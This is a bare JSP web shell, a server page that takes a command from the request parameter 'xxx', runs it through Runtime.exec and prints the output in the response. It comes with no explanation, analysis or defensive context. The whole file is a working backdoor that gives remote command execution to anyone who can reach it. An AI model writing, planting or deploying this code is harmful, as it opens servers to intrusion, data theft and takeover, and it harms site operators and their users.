<%@ page import="java.util.*,java.io.*"%>
<pre>
<%
if (request.getParameter("xxx") != null) {
out.println("Command: " + request.getParameter("xxx") + "<BR>");
Process p = Runtime.getRuntime().exec(request.getParameter("xxx"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
